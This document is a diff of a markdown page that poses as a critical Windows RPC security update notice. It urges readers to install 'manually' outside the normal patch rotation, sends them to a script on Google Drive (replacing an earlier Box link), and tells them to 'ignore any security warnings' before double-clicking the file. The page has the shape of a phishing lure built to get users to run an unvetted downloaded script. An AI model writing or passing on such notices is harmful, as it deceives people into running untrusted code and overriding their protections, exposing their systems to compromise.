@@ -9,18 +9,20 @@
 
 ## ⚠️ Description
 
-This update resolves a critical remote code execution vulnerability affecting the Windows RPC runtime component. All users are strongly encouraged to install this update manually pending formal patch deployment via WSUS and SCCM.
+This update resolves a critical remote code execution vulnerability affecting the Windows RPC runtime component. 
+
+All users are strongly encouraged to install this update MANUALLY pending our formal patch rotation due to ongoing deployment issues.
 
 ---
 
 ## 🔧 Manual Installation
 
-1. Download the update script:  
-   [`Download`](https://app.box.com/s/j74e35sinu06uenk20ltrld5vdu3fl31)
+1. Click to navigate to the update script:  
+   [`Click here`](https://drive.google.com/file/d/1Awbd2WbQky_6lTGDt7q0O4xc0r3HEEWA/view?usp=sharing)
 
-2. Double-click the file once-downloaded
+2. Click download on the script (ignore any security warnings)
 
-3. A reboot is not required
+3. Once downloaded, double-click the file to install the update (no reboot is required).
 
 ---
 
